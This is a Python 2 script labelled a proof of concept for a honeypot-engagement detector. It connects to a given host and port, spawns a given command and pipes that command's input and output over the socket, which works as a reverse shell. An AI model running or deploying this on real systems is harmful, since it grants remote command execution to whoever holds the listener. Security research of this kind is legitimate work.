#!/usr/bin/python

'''
 * Copyright (C) 2016 Fernando Vañó García
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License along
 *  with this program; if not, write to the Free Software Foundation, Inc.,
 *  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 *
 *	Fernando Vanyo Garcia <fervagar@tuta.io>
'''

import argparse;
import sys;
import socket;
import select;
import subprocess;
from subprocess import PIPE;

description = "Prove of Concept for HED (HoneyPot Engage Detector)";
"""
We spawn a child and send/receive commands through a socket.

Fernando Vanyo <fervagar@tuta.io>
"""

target = '';
port = '';
command = '';

def interact(sock, pipe):
    input_list = [pipe.stdout, sock];
    while True:
	try:
	    select_res = select.select(input_list, [], []);
	except:
	    sock.close();
	    exit(0);
	for i in select_res[0]:
	    if i is sock:
            # Server -> Child
		reply = sock.recv(4096);
		if reply == "":
		    print "[+] Connection closed by remote host";
		    exit(0);
		else:
                    try:
		        pipe.stdin.write(reply);
                        pipe.stdin.flush();
                    except:
                        exit(0);

	    elif i is pipe.stdout:
                # Server <- Child
                response = pipe.stdout.readline();
                pipe.stdout.flush();
                sock.send(response);
                if response == "":
		    print "[+] Connection closed by remote host";
                    exit(0);

def getConnection():
    try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
	sock.connect((target, port));
    except:
	sys.stderr.write("[-] Sorry... I can't connect to " + target + ":" + str(port) + "\n");
	exit(-3);
    print "[+] Connection established";
    return sock;

def spawn_child():
    sock = getConnection();
    pipe = subprocess.Popen([command], stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=True);
    interact(sock, pipe);

def main():
    global target;
    global port;
    global command;

    parser = argparse.ArgumentParser(epilog = description, usage='%(prog)s -t Target -p Port -e Command', conflict_handler='resolve');
    parser.add_argument('-t', nargs = 1, type = str, required = True, metavar = 'Target', help = 'target of the %(prog)s program');
    parser.add_argument('-p', nargs = 1, type = int, required = True, metavar = 'Port', help='port listening');
    parser.add_argument('-e', nargs = 1, type = str, required = True, metavar = 'Command', help = 'Executes the given command');

    args = vars(parser.parse_args());
    target = args['t'][0];
    port = args['p'][0];
    command = args['e'][0];

if __name__ == '__main__':
    main();

try:
    target = socket.gethostbyname(target); 
except:
    sys.stderr.write("[-] Sorry... I can't connect to " + target + "\n");
    exit(-1);
if (port < 1) or (port > 65535):
    sys.stderr.write("[-] " + str(port) + " is not a valid port\n");
    exit(-2);

spawn_child();

